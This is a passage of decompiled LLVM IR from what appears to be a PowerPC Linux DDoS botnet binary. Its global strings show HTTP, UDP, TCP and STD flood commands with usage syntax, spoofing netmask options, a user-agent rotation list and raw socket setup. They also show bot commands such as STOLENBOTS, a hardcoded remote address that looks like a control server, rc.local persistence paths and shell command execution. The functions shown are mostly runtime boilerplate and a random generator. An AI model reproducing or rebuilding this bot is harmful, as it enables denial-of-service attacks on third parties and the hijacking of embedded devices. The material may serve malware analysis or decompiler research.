x i8], [6 x i8]* @global_var_10011ea4.412, i32 0, i32 0)]
@global_var_10004a84.414 = constant i32 1207986921
@global_var_10004b04.415 = constant [3 x i8] c"8`\00"
@global_var_10004b2c.416 = constant [3 x i8] c"8`\00"
@global_var_10004b34.417 = constant i32 939524096
@global_var_1000fdb8.418 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1000fdf8.419 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1000fe3c.420 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1000fe80.421 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1000fec4.422 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1000ff08.423 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1000ff4c.424 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1000ff90.425 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_10010074.426 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_100100c0.427 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_10010148.428 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_10010194.429 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_10010204.430 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_10010274.431 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_100102e8.432 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_10010360.433 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_100103a8.434 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_100103d8.435 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_10010418.436 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_10010464.437 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_100104dc.438 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1001054c.439 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_100105bc.440 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_10010630.441 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_100106c4.442 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1001070c.443 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_10010754.444 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_10010794.445 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_10010810.446 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_10010878.447 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_100108f4.448 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_10010944.449 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_10010998.450 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_100109ec.451 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_10010a40.452 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_10023974.453 = global [36 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1000fdb8.418, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_1000fdf8.419, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fe3c.420, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fe80.421, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000fec4.422, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000ff08.423, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1000ff4c.424, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1000ff90.425, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10010000.5, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10010074.426, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_100100c0.427, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10010148.428, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_10010194.429, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_10010204.430, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10010274.431, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_100102e8.432, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10010360.433, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_100103a8.434, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_100103d8.435, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_10010418.436, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @global_var_10010464.437, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @global_var_100104dc.438, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1001054c.439, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100105bc.440, i32 0, i32 0), i8* getelementptr inbounds ([147 x i8], [147 x i8]* @global_var_10010630.441, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_100106c4.442, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1001070c.443, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10010754.444, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_10010794.445, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_10010810.446, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_10010878.447, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_100108f4.448, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10010944.449, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10010998.450, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_100109ec.451, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10010a40.452, i32 0, i32 0)]
@global_var_10011f3c.454 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_10004c1c.455 = constant i32 1207971249
@global_var_10004c98.456 = constant [3 x i8] c"8`\00"
@global_var_10011f7c.457 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_10004df0.458 = constant i32 1207960928
@global_var_10004e44.459 = constant [3 x i8] c"8`\00"
@global_var_10004f10.460 = constant [3 x i8] c"9 \00"
@global_var_10004f74.461 = constant i32 1207960524
@global_var_10011f98.462 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_10004fc4.463 = constant i32 1207960444
@global_var_10004ff8.464 = constant i32 1207985525
@global_var_10005324.465 = constant [3 x i8] c"9 \00"
@global_var_1000546c.466 = constant i32 1207960876
@global_var_100054bc.467 = constant i32 1207960796
@global_var_10011fbc.468 = constant [4 x i8] c"all\00"
@global_var_10011fc0.469 = constant i32 738197504
@global_var_10011fc4.470 = constant [4 x i8] c"syn\00"
@global_var_10011fc8.471 = constant [4 x i8] c"rst\00"
@global_var_10011fcc.472 = constant [4 x i8] c"fin\00"
@global_var_10011fd0.473 = constant [4 x i8] c"ack\00"
@global_var_10011fd4.474 = constant [4 x i8] c"psh\00"
@global_var_10011fd8.475 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1000578c.476 = constant [3 x i8] c"8`\00"
@global_var_10011fec.477 = constant [6 x i8] c"PONG!\00"
@global_var_10005a34.478 = constant i32 1207962616
@global_var_10011ff4.479 = constant [6 x i8] c"PUSSY\00"
@global_var_10011ffc.480 = constant [4 x i8] c"OFF\00"
@global_var_10024a50.481 = local_unnamed_addr global i32 0
@global_var_10012000.482 = constant [14 x i8] c"REP STOPPING!\00"
@global_var_10012010.483 = constant [3 x i8] c"ON\00"
@global_var_10005b5c.484 = constant [3 x i8] c"8`\00"
@global_var_10012014.485 = constant [5 x i8] c"HTTP\00"
@global_var_1001201c.486 = constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00"
@global_var_10005cf4.487 = constant [3 x i8] c"8`\00"
@global_var_10012044.488 = constant [4 x i8] c"UDP\00"
@global_var_10012048.489 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_10005e70.490 = constant i32 1207961532
@global_var_10006018.491 = constant [3 x i8] c"8`\00"
@global_var_10006020.492 = constant [3 x i8] c"8`\00"
@global_var_1000607c.493 = constant [3 x i8] c"8`\00"
@global_var_100120bc.494 = constant [4 x i8] c"TCP\00"
@global_var_100120c0.495 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_100061b4.496 = constant i32 1207960696
@global_var_10006308.497 = constant [3 x i8] c"8`\00"
@global_var_10006310.498 = constant [3 x i8] c"8`\00"
@global_var_10006368.499 = constant [3 x i8] c"8`\00"
@global_var_1001217c.500 = constant [4 x i8] c"STD\00"
@global_var_10012180.501 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_100063fc.502 = constant i32 1207960112
@global_var_100064a4.503 = constant [3 x i8] c"8`\00"
@global_var_100064ac.504 = constant [3 x i8] c"8`\00"
@global_var_100064f4.505 = constant [3 x i8] c"8`\00"
@global_var_1001219c.506 = constant [5 x i8] c"STOP\00"
@global_var_100249e0.507 = local_unnamed_addr global i32 -1
@global_var_10010a94.508 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_100249d8.509 = global [20 x i8]* @global_var_10010a94.508
@global_var_10006710.510 = constant i32 939524219
@global_var_100121a4.511 = constant [8 x i8] c"8.8.8.8\00"
@global_var_100121ac.512 = constant [16 x i8] c"/proc/net/route\00"
@global_var_100121bc.513 = constant [11 x i8] c"\0900000000\09\00"
@global_var_10006a14.514 = constant i32 939524096
@global_var_10024a30.515 = global i32 0
@global_var_10006a68.516 = constant i32 1207959564
@global_var_100121c8.517 = constant [8 x i8] c"POWERPC\00"
@global_var_100121d0.518 = constant i32 0
@global_var_10006b4c.519 = constant [3 x i8] c"8`\00"
@global_var_10006b6c.520 = constant [3 x i8] c"8`\00"
@global_var_10006b8c.521 = constant i32 939524096
@global_var_100121d4.522 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 1912602624
@global_var_100121ec.524 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_100121fc.525 = constant i32 788529152
@global_var_10012200.526 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_10006ca8.527 = constant i32 1207959620
@global_var_10012208.528 = constant i32 1627389952
@global_var_10006d50.529 = constant i32 1207959576
@global_var_10006d5c.530 = constant i32 1207959564
@global_var_10006d6c.531 = constant i32 1207962721
@global_var_10006d98.532 = constant [3 x i8] c"8`\00"
@global_var_1001220c.533 = constant [13 x i8] c"fork failed\0A\00"
@global_var_10006dec.534 = constant i32 1207959576
@global_var_10006e04.535 = constant i32 1207963621
@global_var_10006e14.536 = constant [3 x i8] c"8`\00"
@global_var_10006e20.537 = constant i32 1207959556
@global_var_1001221c.538 = constant i32 458961211
@global_var_10006e88.539 = constant i32 939524096
@global_var_10012284.540 = constant [5 x i8] c"PONG\00"
@global_var_100071cc.541 = constant i32 1207960788
@global_var_1001228c.542 = constant [9 x i8] c"LELIMDUP\00"
@global_var_10012298.543 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_100122ac.544 = constant [11 x i8] c"STOLENBOTS\00"
@global_var_100122b8.545 = constant [8 x i8] c"%s 2>&1\00"
@global_var_100122c0.546 = constant [3 x i8] c"%s\00"
@global_var_100074e4.547 = constant [3 x i8] c"8`\00"
@global_var_10007514.548 = constant [3 x i8] c"8`\00"
@global_var_1000751c.549 = constant i32 939524097
@global_var_100122c4.550 = constant i32 536870912
@global_var_10007758.551 = constant i32 1207959564
@global_var_10007af4.552 = constant i32 1207959560
@global_var_10024a70.553 = local_unnamed_addr global i32 0
@global_var_10007e64.554 = constant i32 939524118
@global_var_100249e8 = external local_unnamed_addr global i32
@global_var_10024a80.560 = global i32 0
@global_var_1000c0d8.561 = constant [3 x i8] c"8`\00"
@global_var_100246c4.562 = global i32 0
@global_var_10024a58.563 = local_unnamed_addr global i32 0
@global_var_10024a5c.564 = local_unnamed_addr global i32 0
@global_var_100080b4.565 = constant i32 1207965629
@global_var_1000829c.566 = constant i32 1207960120
@global_var_10024a0c.567 = local_unnamed_addr global i32 2
@global_var_100246ac.568 = global i32 0
@global_var_10024a08.569 = global i32* bitcast (i16* @global_var_100246dc.557 to i32*)
@global_var_100084d0.570 = constant i32 1207959560
@global_var_10008520.571 = constant [3 x i8] c" c\00"
@global_var_1000853c.572 = constant [3 x i8] c" c\00"
@global_var_100128c8.573 = constant i32 0
@global_var_100087d8.574 = constant i32 1207961092
@global_var_10008904.575 = constant i32 1207960768
@global_var_100128fc.576 = constant i32 269488136
@global_var_100128e0.577 = constant [6 x i8] c"(nil)\00"
@global_var_100128e8.578 = constant [7 x i8] c"(null)\00"
@global_var_100128f0.579 = constant i32 721431808
@global_var_10008d60.580 = constant i32 939524096
@global_var_1001297c.581 = constant i32 65793
@global_var_10012964.582 = constant i32 524293
@global_var_1001295c.583 = constant [8 x i8] c" +0-#'I\00"
@global_var_10012904.584 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_10012944.585 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_10012938.586 = constant i32 67343
@global_var_10012937.587 = constant i32 50331911
@global_var_10012928.588 = constant i32 268435461
@global_var_10012918.589 = constant i32 520093701
@global_var_1000971c.590 = constant [3 x i8] c"8a\00"
@global_var_10009a44.591 = constant i32 1207959708
@global_var_10009aec.592 = constant i32 1207959612
@global_var_10009c38.593 = constant i32 939589631
@global_var_10009cec.594 = constant i32 939524118
@global_var_10012998.595 = constant [8 x i8] c"Success\00"
@global_var_10012988.596 = constant [15 x i8] c"Unknown error \00"
@global_var_10013626.597 = constant i32 1
@global_var_10024a1c.598 = local_unnamed_addr global i32* @global_var_10013626.597
@global_var_10024a60.599 = global i32 0
@global_var_1002aac0.600 = global i32 0
@global_var_1002ac9c.601 = global i32 0
@global_var_1002aad0.602 = global i32 0
@global_var_100249a8.603 = global i32 0
@global_var_10024a8c.604 = local_unnamed_addr global i32 0
@global_var_1002ad88.605 = global i32 0
@global_var_1000aa58.606 = constant [3 x i8] c"8`\00"
@global_var_1000ab3c.607 = constant i32 939524098
@global_var_1000ab7c.608 = constant [3 x i8] c"8`\00"
@global_var_1000ad84.609 = constant i32 939524118
@global_var_1000ae0c.610 = constant i32 939524118
@global_var_1002ace0.611 = global i32 0
@global_var_1002acb0.612 = global i32 0
@global_var_10024a10 = external global i32
@global_var_1002ad60.615 = global i32 0
@global_var_1000b068.616 = constant i32 939524108
@global_var_1000b100.617 = constant [3 x i8] c"8`\00"
@global_var_1000b1ac.618 = constant [3 x i8] c"8`\00"
@global_var_1000b4d4.619 = constant i32 1207959640
@global_var_1000b510.620 = constant i32 1207959580
@global_var_100248d8.621 = global i32 0
@global_var_100248f0 = external global i32
@global_var_10024910.623 = global i32 -1726662223
@global_var_100248f8.624 = local_unnamed_addr global i32* @global_var_10024910.623
@global_var_100248f4.625 = global i32* @global_var_10024910.623
@global_var_100134f4.626 = constant i32 0
@global_var_1000b828.627 = constant i32 939524118
@global_var_1000bc3c.628 = constant i32 939524130
@global_var_1002498c.629 = global i32 0
@global_var_10024a64.630 = local_unnamed_addr global i32 0
@global_var_1000bcd0.631 = constant i32 1207960437
@global_var_10024a6c.632 = local_unnamed_addr global i32 0
@global_var_10023954.633 = global i32 -1
@global_var_10024a74.634 = local_unnamed_addr global i32 0
@global_var_10024a78.635 = local_unnamed_addr global i32 0
@global_var_1001351c.636 = constant [10 x i8] c"/dev/null\00"
@global_var_10024a7c.637 = local_unnamed_addr global i32 0
@global_var_10024a68.638 = local_unnamed_addr global i32 0
@global_var_1000c3f0.639 = constant i32 939524096
@global_var_1000c40c.640 = constant i32 939524096
@global_var_10024aa0.641 = local_unnamed_addr global i32 0
@global_var_10024a84.642 = global i32 0
@global_var_1000c7c8.643 = constant i32 939524180
@global_var_1000cae4.644 = constant i32 939524105
@global_var_10013850.645 = constant [4 x i8] c"inf\00"
@global_var_10013853.647 = constant i32 4804166
@global_var_10013860.648 = constant i32 771763200
@global_var_1002acc8.650 = global i32 0
@global_var_10024a88.651 = local_unnamed_addr global i32 0
@global_var_1000da98.653 = constant i32 1207960848
@global_var_10024a90.654 = local_unnamed_addr global i32 0
@global_var_100138b0.655 = constant i32 771751936
@global_var_1002ad78.656 = global i32 0
@global_var_1000db88.657 = constant [3 x i8] c"8a\00"
@global_var_1000db94.658 = constant i32 939524097
@global_var_1000dc68.659 = constant i32 939524097
@global_var_1000dd3c.660 = constant i32 939524097
@global_var_1000dd68.661 = constant i32 939524100
@global_var_1000de48.662 = constant i32 1207959684
@global_var_1000dfc4.663 = constant i32 939589631
@global_var_100138cc.664 = constant i32 1912602624
@global_var_100138b8.665 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_100138d0.666 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_100138e8.667 = constant [11 x i8] c"nameserver\00"
@global_var_100138f4.668 = constant [7 x i8] c"domain\00"
@global_var_100138fc.669 = constant [7 x i8] c"search\00"
@global_var_1000e2fc.670 = constant i32 1207959568
@global_var_1000e304.671 = constant i32 939524099
@global_var_100249c0.672 = global i32 0
@global_var_1000e464.673 = constant i32 939524129
@global_var_10024a94.674 = local_unnamed_addr global i32 0
@global_var_1000e4d8.675 = constant [3 x i8] c"8`\00"
@global_var_1000e510.676 = constant i32 939524129
@global_var_10024a98.677 = local_unnamed_addr global i32 0
@global_var_10024a9c.678 = local_unnamed_addr global i32 0
@global_var_1000e8ec.679 = constant i32 939524171
@global_var_1000e99c.680 = constant i32 939524105
@global_var_1000ed38.681 = constant [3 x i8] c"8`\00"
@global_var_10013918.682 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000ef30.683 = constant [3 x i8] c"9 \00"
@global_var_1000ef3c.684 = constant i32 939524193
@global_var_1000efa4.686 = constant i32 939524101
@global_var_1000f090.687 = constant i32 939524124
@global_var_1000f108.688 = constant i32 1207960116
@global_var_1000f120.689 = constant i32 939524105
@global_var_1000f298.690 = constant [3 x i8] c"9 \00"
@global_var_1001392c.691 = constant [3 x i8] c"%x\00"
@global_var_1000f324.692 = constant i32 939524124
@global_var_1000f348.693 = constant i32 939524193
@global_var_10013930.694 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001393c.695 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000fa34.696 = constant i32 1207959560
@global_var_1000facc.697 = constant i32 939589631
@global_var_10023958.698 = global i32 0
@global_var_10024aa4.2 = local_unnamed_addr global i8 0
@global_var_10024a40.49 = local_unnamed_addr global i8 0
@global_var_10024a41.50 = local_unnamed_addr global i8 0
@global_var_10024a42.51 = local_unnamed_addr global i8 0
@global_var_10024a43.52 = local_unnamed_addr global i8 0
@global_var_100246dc.557 = global i16 288
@global_var_1002472c.558 = local_unnamed_addr global i16 272
@global_var_100249a4.652 = local_unnamed_addr global i16 1
@global_var_100121e8.523 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_10024aa4.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002396c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002396c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002396c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_10024aa4.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_10024aa4.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_10023964.9, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_10023964.9 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268462776, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32 -616), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10024ac0.10, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_10024ac4.11, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_10024ac8.12, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10024ac0.10 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_10024ac0.10 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_10024ac0.10 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
